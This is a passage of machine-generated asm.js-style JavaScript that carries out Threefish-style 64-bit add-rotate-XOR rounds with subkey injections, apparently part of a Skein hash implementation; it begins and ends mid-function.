            T = zb(ea | 0, _ | 0, 16) | 0;
            ha = y;
            _ = yb(ea | 0, _ | 0, 48) | 0;
            _ = (T | _) ^ V;
            ha = (ha | y) ^ U;
            W = wb(_ | 0, ha | 0, fa | 0, W | 0) | 0;
            fa = y;
            T = zb(_ | 0, ha | 0, 52) | 0;
            ea = y;
            ha = yb(_ | 0, ha | 0, 12) | 0;
            ha = (T | ha) ^ W;
            ea = (ea | y) ^ fa;
            U = wb(ga | 0, Q | 0, V | 0, U | 0) | 0;
            V = y;
            T = zb(ga | 0, Q | 0, 57) | 0;
            _ = y;
            Q = yb(ga | 0, Q | 0, 7) | 0;
            Q = (T | Q) ^ U;
            _ = (_ | y) ^ V;
            fa = wb(Q | 0, _ | 0, W | 0, fa | 0) | 0;
            W = y;
            T = zb(Q | 0, _ | 0, 23) | 0;
            ga = y;
            _ = yb(Q | 0, _ | 0, 41) | 0;
            _ = (T | _) ^ fa;
            ga = (ga | y) ^ W;
            V = wb(ha | 0, ea | 0, U | 0, V | 0) | 0;
            U = y;
            T = zb(ha | 0, ea | 0, 40) | 0;
            Q = y;
            ea = yb(ha | 0, ea | 0, 24) | 0;
            ea = (T | ea) ^ V;
            Q = (Q | y) ^ U;
            W = wb(ea | 0, Q | 0, fa | 0, W | 0) | 0;
            fa = y;
            T = zb(ea | 0, Q | 0, 5) | 0;
            ha = y;
            Q = yb(ea | 0, Q | 0, 59) | 0;
            ha = (ha | y) ^ fa;
            U = wb(_ | 0, ga | 0, V | 0, U | 0) | 0;
            V = y;
            ea = zb(_ | 0, ga | 0, 37) | 0;
            ia = y;
            ga = yb(_ | 0, ga | 0, 27) | 0;
            ia = (ia | y) ^ V;
            fa = wb(W | 0, fa | 0, h | 0, i | 0) | 0;
            _ = y;
            ca = wb((ea | ga) ^ U | 0, ia | 0, aa | 0, ca | 0) | 0;
            aa = y;
            ia = wb(l | 0, m | 0, a | 0, g | 0) | 0;
            ga = y;
            V = wb(U | 0, V | 0, ia | 0, ga | 0) | 0;
            U = y;
            ea = wb(n | 0, o | 0, 5, 0) | 0;
            ha = wb(ea | 0, y | 0, (T | Q) ^ W | 0, ha | 0) | 0;
            W = y;
            _ = wb(fa | 0, _ | 0, ca | 0, aa | 0) | 0;
            fa = y;
            Q = zb(ca | 0, aa | 0, 25) | 0;
            T = y;
            aa = yb(ca | 0, aa | 0, 39) | 0;
            aa = (Q | aa) ^ _;
            T = (T | y) ^ fa;
            U = wb(V | 0, U | 0, ha | 0, W | 0) | 0;
            V = y;
            Q = zb(ha | 0, W | 0, 33) | 0;
            ca = y;
            W = yb(ha | 0, W | 0, 31) | 0;
            W = (Q | W) ^ U;
            ca = (ca | y) ^ V;
            fa = wb(W | 0, ca | 0, _ | 0, fa | 0) | 0;
            _ = y;
            Q = zb(W | 0, ca | 0, 46) | 0;
            ha = y;
            ca = yb(W | 0, ca | 0, 18) | 0;
            ca = (Q | ca) ^ fa;
            ha = (ha | y) ^ _;
            V = wb(aa | 0, T | 0, U | 0, V | 0) | 0;
            U = y;
            Q = zb(aa | 0, T | 0, 12) | 0;
            W = y;
            T = yb(aa | 0, T | 0, 52) | 0;
            T = (Q | T) ^ V;
            W = (W | y) ^ U;
            _ = wb(T | 0, W | 0, fa | 0, _ | 0) | 0;
            fa = y;
            Q = zb(T | 0, W | 0, 58) | 0;
            aa = y;
            W = yb(T | 0, W | 0, 6) | 0;
            W = (Q | W) ^ _;
            aa = (aa | y) ^ fa;
            U = wb(ca | 0, ha | 0, V | 0, U | 0) | 0;
            V = y;
            Q = zb(ca | 0, ha | 0, 22) | 0;
            T = y;
            ha = yb(ca | 0, ha | 0, 42) | 0;
            ha = (Q | ha) ^ U;
            T = (T | y) ^ V;
            fa = wb(ha | 0, T | 0, _ | 0, fa | 0) | 0;
            _ = y;
            V = wb(W | 0, aa | 0, U | 0, V | 0) | 0;
            U = y;
            Q = wb(fa | 0, _ | 0, j | 0, k | 0) | 0;
            ca = y;
            ga = wb(aa ^ V | 0, W ^ U | 0, ia | 0, ga | 0) | 0;
            ia = y;
            W = wb(n | 0, o | 0, p | 0, q | 0) | 0;
            aa = y;
            U = wb(V | 0, U | 0, W | 0, aa | 0) | 0;
            V = y;
            ea = wb($ | 0, Y | 0, 6, 0) | 0;
            _ = wb(ea | 0, y | 0, T ^ fa | 0, ha ^ _ | 0) | 0;
            ha = y;
            ca = wb(Q | 0, ca | 0, ga | 0, ia | 0) | 0;
            Q = y;
            fa = zb(ga | 0, ia | 0, 14) | 0;
            T = y;
            ia = yb(ga | 0, ia | 0, 50) | 0;
            ia = (fa | ia) ^ ca;
            T = (T | y) ^ Q;
            V = wb(U | 0, V | 0, _ | 0, ha | 0) | 0;
            U = y;
            fa = zb(_ | 0, ha | 0, 16) | 0;
            ga = y;
            ha = yb(_ | 0, ha | 0, 48) | 0;
            ha = (fa | ha) ^ V;
            ga = (ga | y) ^ U;
            Q = wb(ha | 0, ga | 0, ca | 0, Q | 0) | 0;
            ca = y;
            fa = zb(ha | 0, ga | 0, 52) | 0;
            _ = y;
            ga = yb(ha | 0, ga | 0, 12) | 0;
            ga = (fa | ga) ^ Q;
            _ = (_ | y) ^ ca;
            U = wb(ia | 0, T | 0, V | 0, U | 0) | 0;
            V = y;
            fa = zb(ia | 0, T | 0, 57) | 0;
            ha = y;
            T = yb(ia | 0, T | 0, 7) | 0;
            T = (fa | T) ^ U;
            ha = (ha | y) ^ V;
            ca = wb(T | 0, ha | 0, Q | 0, ca | 0) | 0;
            Q = y;
            fa = zb(T | 0, ha | 0, 23) | 0;
            ia = y;
            ha = yb(T | 0, ha | 0, 41) | 0;
            ha = (fa | ha) ^ ca;
            ia = (ia | y) ^ Q;
            V = wb(ga | 0, _ | 0, U | 0, V | 0) | 0;
            U = y;
            fa = zb(ga | 0, _ | 0, 40) | 0;
            T = y;
            _ = yb(ga | 0, _ | 0, 24) | 0;
            _ = (fa | _) ^ V;
            T = (T | y) ^ U;
            Q = wb(_ | 0, T | 0, ca | 0, Q | 0) | 0;
            ca = y;
            fa = zb(_ | 0, T | 0, 5) | 0;
            ga = y;
            T = yb(_ | 0, T | 0, 59) | 0;
            ga = (ga | y) ^ ca;
            U = wb(ha | 0, ia | 0, V | 0, U | 0) | 0;
            V = y;
            _ = zb(ha | 0, ia | 0, 37) | 0;
            ea = y;
            ia = yb(ha | 0, ia | 0, 27) | 0;
            ea = (ea | y) ^ V;
            ca = wb(Q | 0, ca | 0, l | 0, m | 0) | 0;
            ha = y;
            aa = wb((_ | ia) ^ U | 0, ea | 0, W | 0, aa | 0) | 0;
            W = y;
            ea = wb($ | 0, Y | 0, E | 0, da | 0) | 0;
            ia = y;
            V = wb(U | 0, V | 0, ea | 0, ia | 0) | 0;
            U = y;
            _ = wb(h | 0, i | 0, 7, 0) | 0;
            ga = wb(_ | 0, y | 0, (fa | T) ^ Q | 0, ga | 0) | 0;
            Q = y;
            ha = wb(ca | 0, ha | 0, aa | 0, W | 0) | 0;
            ca = y;
            T = zb(aa | 0, W | 0, 25) | 0;
            fa = y;
            W = yb(aa | 0, W | 0, 39) | 0;
            W = (T | W) ^ ha;
            fa = (fa | y) ^ ca;
            U = wb(V | 0, U | 0, ga | 0, Q | 0) | 0;
            V = y;
            T = zb(ga | 0, Q | 0, 33) | 0;
            aa = y;
            Q = yb(ga | 0, Q | 0, 31) | 0;
            Q = (T | Q) ^ U;
            aa = (aa | y) ^ V;
            ca = wb(Q | 0, aa | 0, ha | 0, ca | 0) | 0;
            ha = y;
            T = zb(Q | 0, aa | 0, 46) | 0;
            ga = y;
            aa = yb(Q | 0, aa | 0, 18) | 0;
            aa = (T | aa) ^ ca;
            ga = (ga | y) ^ ha;
            V = wb(W | 0, fa | 0, U | 0, V | 0) | 0;
            U = y;
            T = zb(W | 0, fa | 0, 12) | 0;
            Q = y;
            fa = yb(W | 0, fa | 0, 52) | 0;
            fa = (T | fa) ^ V;
            Q = (Q | y) ^ U;
            ha = wb(fa | 0, Q | 0, ca | 0, ha | 0) | 0;
            ca = y;
            T = zb(fa | 0, Q | 0, 58) | 0;
            W = y;
            Q = yb(fa | 0, Q | 0, 6) | 0;
            Q = (T | Q) ^ ha;
            W = (W | y) ^ ca;
            U = wb(aa | 0, ga | 0, V | 0, U | 0) | 0;
            V = y;
            T = zb(aa | 0, ga | 0, 22) | 0;
            fa = y;
            ga = yb(aa | 0, ga | 0, 42) | 0;
            ga = (T | ga) ^ U;
            fa = (fa | y) ^ V;
            ca = wb(ga | 0, fa | 0, ha | 0, ca | 0) | 0;
            ha = y;
            V = wb(Q | 0, W | 0, U | 0, V | 0) | 0;
            U = y;
            T = wb(ca | 0, ha | 0, n | 0, o | 0) | 0;
            aa = y;
            ia = wb(W ^ V | 0, Q ^ U | 0, ea | 0, ia | 0) | 0;
            ea = y;
            Q = wb(h | 0, i | 0, a | 0, g | 0) | 0;
            W = y;
            U = wb(V | 0, U | 0, Q | 0, W | 0) | 0;
            V = y;
            _ = wb(j | 0, k | 0, 8, 0) | 0;
            ha = wb(_ | 0, y | 0, fa ^ ca | 0, ga ^ ha | 0) | 0;
            ga = y;
            aa = wb(T | 0, aa | 0, ia | 0, ea | 0) | 0;
            T = y;
            ca = zb(ia | 0, ea | 0, 14) | 0;
            fa = y;
            ea = yb(ia | 0, ea | 0, 50) | 0;
            ea = (ca | ea) ^ aa;
            fa = (fa | y) ^ T;
            V = wb(U | 0, V | 0, ha | 0, ga | 0) | 0;
            U = y;
            ca = zb(ha | 0, ga | 0, 16) | 0;
            ia = y;
            ga = yb(ha | 0, ga | 0, 48) | 0;
            ga = (ca | ga) ^ V;
            ia = (ia | y) ^ U;
            T = wb(ga | 0, ia | 0, aa | 0, T | 0) | 0;
            aa = y;
            ca = zb(ga | 0, ia | 0, 52) | 0;
            ha = y;
            ia = yb(ga | 0, ia | 0, 12) | 0;
            ia = (ca | ia) ^ T;
            ha = (ha | y) ^ aa;
            U = wb(ea | 0, fa | 0, V | 0, U | 0) | 0;
            V = y;
            ca = zb(ea | 0, fa | 0, 57) | 0;
            ga = y;
            fa = yb(ea | 0, fa | 0, 7) | 0;
            fa = (ca | fa) ^ U;
            ga = (ga | y) ^ V;
            aa = wb(fa | 0, ga | 0, T | 0, aa | 0) | 0;
            T = y;
            ca = zb(fa | 0, ga | 0, 23) | 0;
            ea = y;
            ga = yb(fa | 0, ga | 0, 41) | 0;
            ga = (ca | ga) ^ aa;
            ea = (ea | y) ^ T;
            V = wb(ia | 0, ha | 0, U | 0, V | 0) | 0;
            U = y;
            ca = zb(ia | 0, ha | 0, 40) | 0;
            fa = y;
            ha = yb(ia | 0, ha | 0, 24) | 0;
            ha = (ca | ha) ^ V;
            fa = (fa | y) ^ U;
            T = wb(ha | 0, fa | 0, aa | 0, T | 0) | 0;
            aa = y;
            ca = zb(ha | 0, fa | 0, 5) | 0;
            ia = y;
            fa = yb(ha | 0, fa | 0, 59) | 0;
            ia = (ia | y) ^ aa;
            U = wb(ga | 0, ea | 0, V | 0, U | 0) | 0;
            V = y;
            ha = zb(ga | 0, ea | 0, 37) | 0;
            _ = y;
            ea = yb(ga | 0, ea | 0, 27) | 0;
            _ = (_ | y) ^ V;
            aa = wb(T | 0, aa | 0, $ | 0, Y | 0) | 0;
            ga = y;
            W = wb((ha | ea) ^ U | 0, _ | 0, Q | 0, W | 0) | 0;
            Q = y;
            _ = wb(j | 0, k | 0, p | 0, q | 0) | 0;
            ea = y;
            V = wb(U | 0, V | 0, _ | 0, ea | 0) | 0;
            U = y;
            ha = wb(l | 0, m | 0, 9, 0) | 0;
            ia = wb(ha | 0, y | 0, (ca | fa) ^ T | 0, ia | 0) | 0;
            T = y;
            ga = wb(aa | 0, ga | 0, W | 0, Q | 0) | 0;
            aa = y;
            fa = zb(W | 0, Q | 0, 25) | 0;
            ca = y;
            Q = yb(W | 0, Q | 0, 39) | 0;
            Q = (fa | Q) ^ ga;
            ca = (ca | y) ^ aa;
            U = wb(V | 0, U | 0, ia | 0, T | 0) | 0;
            V = y;
            fa = zb(ia | 0, T | 0, 33) | 0;
            W = y;
            T = yb(ia | 0, T | 0, 31) | 0;
            T = (fa | T) ^ U;
            W = (W | y) ^ V;
            aa = wb(T | 0, W | 0, ga | 0, aa | 0) | 0;
            ga = y;
            fa = zb(T | 0, W | 0, 46) | 0;
            ia = y;
            W = yb(T | 0, W | 0, 18) | 0;
            W = (fa | W) ^ aa;
            ia = (ia | y) ^ ga;
            V = wb(Q | 0, ca | 0, U | 0, V | 0) | 0;
            U = y;
            fa = zb(Q | 0, ca | 0, 12) | 0;
            T = y;
            ca = yb(Q | 0, ca | 0, 52) | 0;
            ca = (fa | ca) ^ V;
            T = (T | y) ^ U;
            ga = wb(ca | 0, T | 0, aa | 0, ga | 0) | 0;
            aa = y;
            fa = zb(ca | 0, T | 0, 58) | 0;
            Q = y;
            T = yb(ca | 0, T | 0, 6) | 0;
            T = (fa | T) ^ ga;
            Q = (Q | y) ^ aa;
            U = wb(W | 0, ia | 0, V | 0, U | 0) | 0;
            V = y;
            fa = zb(W | 0, ia | 0, 22) | 0;
            ca = y;
            ia = yb(W | 0, ia | 0, 42) | 0;
            ia = (fa | ia) ^ U;
            ca = (ca | y) ^ V;
            aa = wb(ia | 0, ca | 0, ga | 0, aa | 0) | 0;
            ga = y;
            V = wb(T | 0, Q | 0, U | 0, V | 0) | 0;
            U = y;
            fa = wb(aa | 0, ga | 0, h | 0, i | 0) | 0;
            W = y;
            ea = wb(Q ^ V | 0, T ^ U | 0, _ | 0, ea | 0) | 0;
            _ = y;
            T = wb(l | 0, m | 0, E | 0, da | 0) | 0;
            Q = y;
            U = wb(V | 0, U | 0, T | 0, Q | 0) | 0;
            V = y;
            ha = wb(n | 0, o | 0, 10, 0) | 0;
            ga = wb(ha | 0, y | 0, ca ^ aa | 0, ia ^ ga | 0) | 0;
            ia = y;
            W = wb(fa | 0, W | 0, ea | 0, _ | 0) | 0;
            fa = y;
            aa = zb(ea | 0, _ | 0, 14) | 0;
            ca = y;
            _ = yb(ea | 0, _ | 0, 50) | 0;
            _ = (aa | _) ^ W;
            ca = (ca | y) ^ fa;
            V = wb(U | 0, V | 0, ga | 0, ia | 0) | 0;
            U = y;
            aa = zb(ga | 0, ia | 0, 16) | 0;
            ea = y;
            ia = yb(ga | 0, ia | 0, 48) | 0;
            ia = (aa | ia) ^ V;
            ea = (ea | y) ^ U;
            fa = wb(ia | 0, ea | 0, W | 0, fa | 0) | 0;
            W = y;
            aa = zb(ia | 0, ea | 0, 52) | 0;
            ga = y;
            ea = yb(ia | 0, ea | 0, 12) | 0;
            ea = (aa | ea) ^ fa;
            ga = (ga | y) ^ W;
            U = wb(_ | 0, ca | 0, V | 0, U | 0) | 0;
            V = y;
            aa = zb(_ | 0, ca | 0, 57) | 0;
            ia = y;
            ca = yb(_ | 0, ca | 0, 7) | 0;
            ca = (aa | ca) ^ U;
            ia = (ia | y) ^ V;
            W = wb(ca | 0, ia | 0, fa | 0, W | 0) | 0;
            fa = y;
            aa = zb(ca | 0, ia | 0, 23) | 0;
            _ = y;
            ia = yb(ca | 0, ia | 0, 41) | 0;
            ia = (aa | ia) ^ W;
            _ = (_ | y) ^ fa;
            V = wb(ea | 0, ga | 0, U | 0, V | 0) | 0;
            U = y;
            aa = zb(ea | 0, ga | 0, 40) | 0;
            ca = y;
            ga = yb(ea | 0, ga | 0, 24) | 0;
            ga = (aa | ga) ^ V;
            ca = (ca | y) ^ U;
            fa = wb(ga | 0, ca | 0, W | 0, fa | 0) | 0;
            W = y;
            aa = zb(ga | 0, ca | 0, 5) | 0;
            ea = y;
            ca = yb(ga | 0, ca | 0, 59) | 0;
            ea = (ea | y) ^ W;
            U = wb(ia | 0, _ | 0, V | 0, U | 0) | 0;
            V = y;
            ga = zb(ia | 0, _ | 0, 37) | 0;
            ha = y;
            _ = yb(ia | 0, _ | 0, 27) | 0;
            ha = (ha | y) ^ V;
            W = wb(fa | 0, W | 0, j | 0, k | 0) | 0;
            ia = y;
            Q = wb((ga | _) ^ U | 0, ha | 0, T | 0, Q | 0) | 0;
            T = y;
            ha = wb(n | 0, o | 0, a | 0, g | 0) | 0;
            _ = y;
            V = wb(U | 0, V | 0, ha | 0, _ | 0) | 0;
            U = y;
            ga = wb($ | 0, Y | 0, 11, 0) | 0;
            ea = wb(ga | 0, y | 0, (aa | ca) ^ fa | 0, ea | 0) | 0;
            fa = y;
            ia = wb(W | 0, ia | 0, Q | 0, T | 0) | 0;
            W = y;
            ca = zb(Q | 0, T | 0, 25) | 0;
            aa = y;
            T = yb(Q | 0, T | 0, 39) | 0;
            T = (ca | T) ^ ia;
            aa = (aa | y) ^ W;
            U = wb(V | 0, U | 0, ea | 0, fa | 0) | 0;
            V = y;
            ca = zb(ea | 0, fa | 0, 33) | 0;
            Q = y;
            fa = yb(ea | 0, fa | 0, 31) | 0;
            fa = (ca | fa) ^ U;
            Q = (Q | y) ^ V;
            W = wb(fa | 0, Q | 0, ia | 0, W | 0) | 0;
            ia = y;
            ca = zb(fa | 0, Q | 0, 46) | 0;
            ea = y;
            Q = yb(fa | 0, Q | 0, 18) | 0;
            Q = (ca | Q) ^ W;
            ea = (ea | y) ^ ia;
            V = wb(T | 0, aa | 0, U | 0, V | 0) | 0;
            U = y;
            ca = zb(T | 0, aa | 0, 12) | 0;
            fa = y;
            aa = yb(T | 0, aa | 0, 52) | 0;
            aa = (ca | aa) ^ V;
            fa = (fa | y) ^ U;
            ia = wb(aa | 0, fa | 0, W | 0, ia | 0) | 0;
            W = y;
            ca = zb(aa | 0, fa | 0, 58) | 0;
            T = y;
            fa = yb(aa | 0, fa | 0, 6) | 0;
            fa = (ca | fa) ^ ia;
            T = (T | y) ^ W;
            U = wb(Q | 0, ea | 0, V | 0, U | 0) | 0;
            V = y;
            ca = zb(Q | 0, ea | 0, 22) | 0;
            aa = y;
            ea = yb(Q | 0, ea | 0, 42) | 0;
            ea = (ca | ea) ^ U;
            aa = (aa | y) ^ V;
            W = wb(ea | 0, aa | 0, ia | 0, W | 0) | 0;
            ia = y;
            V = wb(fa | 0, T | 0, U | 0, V | 0) | 0;
            U = y;
            ca = wb(W | 0, ia | 0, l | 0, m | 0) | 0;
            Q = y;
            _ = wb(T ^ V | 0, fa ^ U | 0, ha | 0, _ | 0) | 0;
            ha = y;
            fa = wb($ | 0, Y | 0, p | 0, q | 0) | 0;
            T = y;
            U = wb(V | 0, U | 0, fa | 0, T | 0) | 0;
            V = y;
            ga = wb(h | 0, i | 0, 12, 0) | 0;
            ia = wb(ga | 0, y | 0, aa ^ W | 0, ea ^ ia | 0) | 0;
            ea = y;
            Q = wb(ca | 0, Q | 0, _ | 0, ha | 0) | 0;
            ca = y;
            W = zb(_ | 0, ha | 0, 14) | 0;
            aa = y;
            ha = yb(_ | 0, ha | 0, 50) | 0;
            ha = (W | ha) ^ Q;
            aa = (aa | y) ^ ca;
            V = wb(U | 0, V | 0, ia | 0, ea | 0) | 0;
            U = y;
            W = zb(ia | 0, ea | 0, 16) | 0;
            _ = y;
            ea = yb(ia | 0, ea | 0, 48) | 0;
            ea = (W | ea) ^ V;
            _ = (_ | y) ^ U;
            ca = wb(ea | 0, _ | 0, Q | 0, ca | 0) | 0;
            Q = y;
            W = zb(ea | 0, _ | 0, 52) | 0;
            ia = y;
            _ = yb(ea | 0, _ | 0, 12) | 0;
            _ = (W | _) ^ ca;
            ia = (ia | y) ^ Q;
            U = wb(ha | 0, aa | 0, V | 0, U | 0) | 0;
            V = y;
            W = zb(ha | 0, aa | 0, 57) | 0;
            ea = y;
            aa = yb(ha | 0, aa | 0, 7) | 0;
            aa = (W | aa) ^ U;
            ea = (ea | y) ^ V;
            Q = wb(aa | 0, ea | 0, ca | 0, Q | 0) | 0;
            ca = y;
            W = zb(aa | 0, ea | 0, 23) | 0;
            ha = y;
            ea = yb(aa | 0, ea | 0, 41) | 0;
            ea = (W | ea) ^ Q;
            ha = (ha | y) ^ ca;
            V = wb(_ | 0, ia | 0, U | 0, V | 0) | 0;
            U = y;
            W = zb(_ | 0, ia | 0, 40) | 0;
            aa = y;
            ia = yb(_ | 0, ia | 0, 24) | 0;
            ia = (W | ia) ^ V;
            aa = (aa | y) ^ U;
            ca = wb(ia | 0, aa | 0, Q | 0, ca | 0) | 0;
            Q = y;
            W = zb(ia | 0, aa | 0, 5) | 0;
            _ = y;
            aa = yb(ia | 0, aa | 0, 59) | 0;
            _ = (_ | y) ^ Q;
            U = wb(ea | 0, ha | 0, V | 0, U | 0) | 0;
            V = y;
            ia = zb(ea | 0, ha | 0, 37) | 0;
            ga = y;
            ha = yb(ea | 0, ha | 0, 27) | 0;
            ga = (ga | y) ^ V;
            Q = wb(ca | 0, Q | 0, n | 0, o | 0) | 0;
            ea = y;
            T = wb((ia | ha) ^ U | 0, ga | 0, fa | 0, T | 0) | 0;
            fa = y;
            da = wb(h | 0, i | 0, E | 0, da | 0) | 0;
            E = y;
            V = wb(U | 0, V | 0, da | 0, E | 0) | 0;
            U = y;
            ga = wb(j | 0, k | 0, 13, 0) | 0;
            _ = wb(ga | 0, y | 0, (W | aa) ^ ca | 0, _ | 0) | 0;
            ca = y;
            ea = wb(Q | 0, ea | 0, T | 0, fa | 0) | 0;
            Q = y;
            aa = zb(T | 0, fa | 0, 25) | 0;
            W = y;
            fa = yb(T | 0, fa | 0, 39) | 0;
            fa = (aa | fa) ^ ea;
            W = (W | y) ^ Q;
            U = wb(V | 0, U | 0, _ | 0, ca | 0) | 0;
            V = y;
            aa = zb(_ | 0, ca | 0, 33) | 0;
            T = y;
            ca = yb(_ | 0, ca | 0, 31) | 0;
            ca = (aa | ca) ^ U;
            T = (T | y) ^ V;
            Q = wb(ca | 0, T | 0, ea | 0, Q | 0) | 0;
            ea = y;
            aa = zb(ca | 0, T | 0, 46) | 0;
            _ = y;
            T = yb(ca | 0, T | 0, 18) | 0;
            T = (aa | T) ^ Q;
            _ = (_ | y) ^ ea;
            V = wb(fa | 0, W | 0, U | 0, V | 0) | 0;
            U = y;
            aa = zb(fa | 0, W | 0, 12) | 0;
            ca = y;
            W = yb(fa | 0, W | 0, 52) | 0;
            W = (aa | W) ^ V;
            ca = (ca | y) ^ U;
            ea = wb(W | 0, ca | 0, Q | 0, ea | 0) | 0;
            Q = y;
            aa = zb(W | 0, ca | 0, 58) | 0;
            fa = y;
            ca = yb(W | 0, ca | 0, 6) | 0;
            ca = (aa | ca) ^ ea;
            fa = (fa | y) ^ Q;
            U = wb(T | 0, _ | 0, V | 0, U | 0) | 0;
            V = y;
            aa = zb(T | 0, _ | 0, 22) | 0;
            W = y;
            _ = yb(T | 0, _ | 0, 42) | 0;
            _ = (aa | _) ^ U;
            W = (W | y) ^ V;
            Q = wb(_ | 0, W | 0, ea | 0, Q | 0) | 0;
            ea = y;
            V = wb(ca | 0, fa | 0, U | 0, V | 0) | 0;
            U = y;
            aa = wb(Q | 0, ea | 0, $ | 0, Y | 0) | 0;
            T = y;
            E = wb(fa ^ V | 0, ca ^ U | 0, da | 0, E | 0) | 0;
            da = y;
            U = wb(V | 0, U | 0, ba | 0, S | 0) | 0;
            V = y;
            ca = wb(l | 0, m | 0, 14, 0) | 0;
            ea = wb(ca | 0, y | 0, W ^ Q | 0, _ ^ ea | 0) | 0;
            _ = y;
            T = wb(aa | 0, T | 0, E | 0, da | 0) | 0;
            aa = y;
            Q = zb(E | 0, da | 0, 14) | 0;
            W = y;
            da = yb(E | 0, da | 0, 50) | 0;
            da = (Q | da) ^ T;
            W = (W | y) ^ aa;
            V = wb(U | 0, V | 0, ea | 0, _ | 0) | 0;
            U = y;
            Q = zb(ea | 0, _ | 0, 16) | 0;
            E = y;
            _ = yb(ea | 0, _ | 0, 48) | 0;
            _ = (Q | _) ^ V;
            E = (E | y) ^ U;
            aa = wb(_ | 0, E | 0, T | 0, aa | 0) | 0;
            T = y;
            Q = zb(_ | 0, E | 0, 52) | 0;
            ea = y;
            E = yb(_ | 0, E | 0, 12) | 0;
            E = (Q | E) ^ aa;
            ea = (ea | y) ^ T;
            U = wb(da | 0, W | 0, V | 0, U | 0) | 0;
            V = y;
            Q = zb(da | 0, W | 0, 57) | 0;
            _ = y;
            W = yb(da | 0, W | 0, 7) | 0;
            W = (Q | W) ^ U;
            _ = (_ | y) ^ V;
            T = wb(W | 0, _ | 0, aa | 0, T | 0) | 0;
            aa = y;
            Q = zb(W | 0, _ | 0, 23) | 0;
            da = y;
            _ = yb(W | 0, _ | 0, 41) | 0;
            _ = (Q | _) ^ T;
            da = (da | y) ^ aa;
            V = wb(E | 0, ea | 0, U | 0, V | 0) | 0;
            U = y;
            Q = zb(E | 0, ea | 0, 40) | 0;
            W = y;
            ea = yb(E | 0, ea | 0, 24) | 0;
            ea = (Q | ea) ^ V;
            W = (W | y) ^ U;
            aa = wb(ea | 0, W | 0, T | 0, aa | 0) | 0;
            T = y;
            Q = zb(ea | 0, W | 0, 5) | 0;
            E = y;
            W = yb(ea | 0, W | 0, 59) | 0;
            E = (E | y) ^ T;
            U = wb(_ | 0, da | 0, V | 0, U | 0) | 0;
            V = y;
            ea = zb(_ | 0, da | 0, 37) | 0;
            ca = y;
            da = yb(_ | 0, da | 0, 27) | 0;
            ca = (ca | y) ^ V;
            T = wb(aa | 0, T | 0, h | 0, i | 0) | 0;
            _ = y;
            S = wb((ea | da) ^ U | 0, ca | 0, ba | 0, S | 0) | 0;
            ba = y;
            V = wb(U | 0, V | 0, Z | 0, R | 0) | 0;
            U = y;
            ca = wb(n | 0, o | 0, 15, 0) | 0;
            E = wb(ca | 0, y | 0, (Q | W) ^ aa | 0, E | 0) | 0;
            aa = y;
            _ = wb(T | 0, _ | 0, S | 0, ba | 0) | 0;
            T = y;
            W = zb(S | 0, ba | 0, 25) | 0;
            Q = y;
            ba = yb(S | 0, ba | 0, 39) | 0;
            ba = (W | ba) ^ _;
            Q = (Q | y) ^ T;
            U = wb(V | 0, U | 0, E | 0, aa | 0) | 0;
            V = y;
            W = zb(E | 0, aa | 0, 33) | 0;
            S = y;
            aa = yb(E | 0, aa | 0, 31) | 0;
            aa = (W | aa) ^ U;
            S = (S | y) ^ V;
            T = wb(aa | 0, S | 0, _ | 0, T | 0) | 0;
            _ = y;
            W = zb(aa | 0, S | 0, 46) | 0;
            E = y;
            S = yb(aa | 0, S | 0, 18) | 0;
            S = (W | S) ^ T;
            E = (E | y) ^ _;
            V = wb(ba | 0, Q | 0, U | 0, V | 0) | 0;
            U = y;
            W = zb(ba | 0, Q | 0, 12) | 0;
            aa = y;
            Q = yb(ba | 0, Q | 0, 52) | 0;
            Q = (W | Q) ^ V;
            aa = (aa | y) ^ U;
            _ = wb(Q | 0, aa | 0, T | 0, _ | 0) | 0;
            T = y;
            W = zb(Q | 0, aa | 0, 58) | 0;
            ba = y;
            aa = yb(Q | 0, aa | 0, 6) | 0;
            aa = (W | aa) ^ _;
            ba = (ba | y) ^ T;
            U = wb(S | 0, E | 0, V | 0, U | 0) | 0;
            V = y;
            W = zb(S | 0, E | 0, 22) | 0;
            Q = y;
            E = yb(S | 0, E | 0, 42) | 0;
            E = (W | E) ^ U;
            Q = (Q | y) ^ V;
            T = wb(E | 0, Q | 0, _ | 0, T | 0) | 0;
            _ = y;
            V = wb(aa | 0, ba | 0, U | 0, V | 0) | 0;
            U = y;
            W = wb(T | 0, _ | 0, j | 0, k | 0) | 0;
            S = y;
            R = wb(ba ^ V | 0, aa ^ U | 0, Z | 0, R | 0) | 0;
            Z = y;
            U = wb(V | 0, U | 0, X | 0, O | 0) | 0;
            V = y;
            Y = wb($ | 0, Y | 0, 16, 0) | 0;
            _ = wb(Y | 0, y | 0, Q ^ T | 0, E ^ _ | 0) | 0;
            E = y;
            S = wb(W | 0, S | 0, R | 0, Z | 0) | 0;
            W = y;
            T = zb(R | 0, Z | 0, 14) | 0;
            Q = y;
            Z = yb(R | 0, Z | 0, 50) | 0;
            Z = (T | Z) ^ S;
            Q = (Q | y) ^ W;
            V = wb(U | 0, V | 0, _ | 0, E | 0) | 0;
            U = y;
            T = zb(_ | 0, E | 0, 16) | 0;
            R = y;
            E = yb(_ | 0, E | 0, 48) | 0;
            E = (T | E) ^ V;
            R = (R | y) ^ U;
            W = wb(E | 0, R | 0, S | 0, W | 0) | 0;
            S = y;
            T = zb(E | 0, R | 0, 52) | 0;
            _ = y;
            R = yb(E | 0, R | 0, 12) | 0;
            R = (T | R) ^ W;
            _ = (_ | y) ^ S;
            U = wb(Z | 0, Q | 0, V | 0, U | 0) | 0;
            V = y;
            T = zb(Z | 0, Q | 0, 57) | 0;
            E = y;
            Q = yb(Z | 0, Q | 0, 7) | 0;
            Q = (T | Q) ^ U;
            E = (E | y) ^ V;
            S = wb(Q | 0, E | 0, W | 0, S | 0) | 0;
            W = y;
            T = zb(Q | 0, E | 0, 23) | 0;
            Z = y;
            E = yb(Q | 0, E | 0, 41) | 0;
            E = (T | E) ^ S;
            Z = (Z | y) ^ W;
            V = wb(R | 0, _ | 0, U | 0, V | 0) | 0;
            U = y;
            T = zb(R | 0, _ | 0, 40) | 0;
            Q = y;
            _ = yb(R | 0, _ | 0, 24) | 0;
            _ = (T | _) ^ V;
            Q = (Q | y) ^ U;
            W = wb(_ | 0, Q | 0, S | 0, W | 0) | 0;
            S = y;
            T = zb(_ | 0, Q | 0, 5) | 0;
            R = y;
            Q = yb(_ | 0, Q | 0, 59) | 0;
            R = (R | y) ^ S;
            U = wb(E | 0, Z | 0, V | 0, U | 0) | 0;
            V = y;
            _ = zb(E | 0, Z | 0, 37) | 0;
            Y = y;
            Z = yb(E | 0, Z | 0, 27) | 0;
            Y = (Y | y) ^ V;
